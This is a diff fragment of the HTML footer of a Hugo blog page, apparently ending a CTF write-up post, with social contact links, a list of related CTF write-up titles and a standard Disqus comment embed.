+<a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg>
+</div>
+</a>
+<a href=354c3267364c2b5a354c6d49354c7147364b656a356f69523737794d354c69413561366136494f393534796335596977355a436e37377966 target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg>
+</div>
+</a>
+<a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg>
+</div>
+</a>
+<a href=vickyckyky target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg>
+</div>
+</a>
+<a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg>
+</div>
+</a>
+<a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg>
+</div>
+</a>
+</div>
+<div class="text-sm text-gray-500 leading-tight a-gray">
+<br>
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 4219 words in this page.
+</div>
+</div>
+</div>
+</aside>
+<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
+<hr class=double-line>
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+<a class=flex-grow-0 href=/2021/12/13/smth-about-include-require-in-php/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>
+关于include/require(_once)的易混淆点
+</a>
+</div>
+<div>
+<div class="font-serif pb-2 flex align-start leading-loose">
+<span class="heading pr-6 leading-loose">Related</span>
+<span>
+<a href=/2021/12/12/nitectf2021-wp/>niteCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/17/jueyucup-2021-wp/>深育杯2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/16/longyuanzhanyi-ctf-wp/>陇原战疫CTF Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/16/ctfshow-1121-jjcup-wp/>CTFshow1121击剑杯 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/14/bilibili-sec1024-wp/>Bilibili 1024安全攻防 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/07/buuoj-fixchalls-wp/>buuoj加固题 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/30/killerqueenctf2021-wp/>KillerQueenCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/30/deconstructf2021-wp/>DeconstruCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/26/qwnt2021-wp/>2021强网拟态 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/24/dasctf1021-wp/>DasCTF1021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/22/digitaloverdosectf2021-wp/>DigitalOverdoseCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/04/tsgctf2021-wp/>TSGCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/09/13/tsuku2021-wp/>TsukuCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/09/07/grabconctf2021-wp/>GrabCONCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/09/05/ssctf2021-wp/>SSCTF2021 Wp</a>
+</span>
+</div>
+</div>
+<hr>
+<div class=pb-2>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//amiaaaz.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+<hr>
+</footer>
+<script src=/dist/app.js></script>
+<script src=/lib/fuse.min.js></script>
+<script src=/lib/fastsearch.js></script>
+</div>
+</body>
+</html>
